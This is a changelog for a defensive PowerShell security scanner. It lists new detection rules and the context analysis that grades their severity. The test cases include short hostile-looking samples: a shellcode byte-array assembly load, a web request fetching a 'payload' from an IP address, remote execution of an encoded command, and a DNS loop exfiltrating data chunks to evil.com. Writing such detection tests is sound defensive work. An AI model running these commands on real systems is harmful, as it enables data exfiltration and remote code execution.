# Scanner Script Updates - v1.1.0

## Overview

Updated `Invoke-SecurityScan.ps1` to support the 20 new security detection rules added in SecurityDetectionRules.psd1 v1.1.0.

## Changes Made

### Version Update
- **Version**: 1.0.0 → 1.1.0
- Updated script header and console output

### New Context Analysis Rules

Added intelligent context analysis for 7 new rules to reduce false positives while maintaining security coverage:

#### 1. PS041 - .NET Reflection Assembly Loading
- **Safe Pattern**: Loading known assemblies by name (System.*, Microsoft.*, .dll files)
  - Severity: Info
- **Suspicious Pattern**: Loading from byte arrays
  - Severity: Critical (potential shellcode)

#### 2. PS042 - COM Object Creation
- **Safe Pattern**: Common legitimate COM objects
  - Office applications (Outlook, Excel, Word)
  - Scripting components (Dictionary, FileSystemObject)
  - Database (ADODB)
  - Severity: Info
- **Suspicious Pattern**: WScript.Shell or Shell.Application
  - Severity: High (potential command execution)

#### 3. PS051 - Suspicious Web Requests
- **Safe Pattern**: Known trusted domains
  - github.com, microsoft.com, powershellgallery.com, etc.
  - Severity: Info
- **Suspicious Pattern**: IP addresses or encoded URLs
  - Severity: High (potential C2 communication)

#### 4. PS056 - PowerShell Remoting
- **Default**: Normal administrative activity
  - Severity: Info
- **Suspicious Pattern**: Encoded commands or obfuscation
  - Severity: High (potential lateral movement)

#### 5. PS058 - Clipboard Access
- **Default**: Legitimate in automation scenarios
  - Severity: Info

#### 6. PS060 - DNS Tunneling
- **Default**: Normal DNS lookups
  - Severity: Info
- **Suspicious Pattern**: DNS queries in loops or with encoding
  - Severity: Medium (potential data exfiltration)

## Rules Without Context Analysis

The following new rules work correctly with the existing pattern matching system and don't require additional context filtering:

- **PS043** - WMI/CIM Command Execution (High severity is appropriate)
- **PS044** - Script Block Logging Disabled (Critical - always flag)
- **PS045** - AMSI Bypass Attempt (Critical - always flag)
- **PS046** - Constrained Language Mode Bypass (Critical - always flag)
- **PS047** - Execution Policy Bypass (Medium - always flag)
- **PS048** - Suspicious Encoded Command (High - always flag)
- **PS049** - Reflective DLL Injection (Critical - always flag)
- **PS050** - Process Injection Techniques (Critical - always flag)
- **PS052** - Kerberos Ticket Manipulation (Critical - always flag)
- **PS053** - Windows Event Log Manipulation (High - always flag)
- **PS054** - Token Manipulation (High - always flag)
- **PS055** - LOLBins Abuse (Medium - always flag)
- **PS057** - UAC Bypass Techniques (High - always flag)
- **PS059** - Screen Capture Attempt (Medium - always flag)

## Testing Recommendations

### Test Cases for New Context Analysis

1. **PS041 - Assembly Loading**
   ```powershell
   # Should be Info
   [Reflection.Assembly]::Load("System.Management.Automation")
   
   # Should be Critical
   [Reflection.Assembly]::Load([byte[]]$shellcode)
   ```

2. **PS042 - COM Objects**
   ```powershell
   # Should be Info
   $outlook = New-Object -ComObject Outlook.Application
   
   # Should be High
   $shell = New-Object -ComObject WScript.Shell
   ```

3. **PS051 - Web Requests**
   ```powershell
   # Should be Info
   Invoke-WebRequest -Uri "https://github.com/user/repo"
   
   # Should be High
   Invoke-WebRequest -Uri "http://192.168.1.100/payload"
   ```

4. **PS056 - PS Remoting**
   ```powershell
   # Should be Info
   Enter-PSSession -ComputerName Server01
   
   # Should be High
   Invoke-Command -ComputerName Server01 -ScriptBlock { iex $encoded }
   ```

5. **PS058 - Clipboard**
   ```powershell
   # Should be Info
   Get-Clipboard | Out-File log.txt
   ```

6. **PS060 - DNS Queries**
   ```powershell
   # Should be Info
   Resolve-DnsName google.com
   
   # Should be Medium
   foreach ($chunk in $data) { Resolve-DnsName "$chunk.evil.com" }
   ```

## Compatibility

- **PowerShell Version**: 5.1+ (no breaking changes)
- **Dependencies**: No new dependencies added
- **Rules File**: Requires SecurityDetectionRules.psd1 v1.1.0

## Performance Impact

- Minimal performance impact
- Context analysis only runs when rules match
- Average 5-10 additional lines of code read per matched finding

## Benefits

1. **Reduced False Positives**: Legitimate uses of assemblies, COM objects, and web requests won't clutter reports
2. **Maintained Security**: Critical threats still flagged at appropriate severity
3. **Better Developer Experience**: Clearer, more actionable security reports
4. **Intelligent Severity**: Dynamic severity adjustment based on context

## Migration Notes

No breaking changes. The scanner is backward compatible with SecurityDetectionRules.psd1 v1.0.0.

If you upgrade the rules file to v1.1.0 without upgrading the scanner:
- ✅ New rules will be detected using pattern matching
- ⚠️ Some false positives may occur (no context filtering)
- ✅ All critical threats will still be flagged

**Recommendation**: Upgrade both files together for optimal results.

## Version Information

- **Scanner Version**: 1.1.0
- **Rules Version**: 1.1.0
- **Last Updated**: 2025-11-25
- **Compatibility**: PowerShell 5.1+
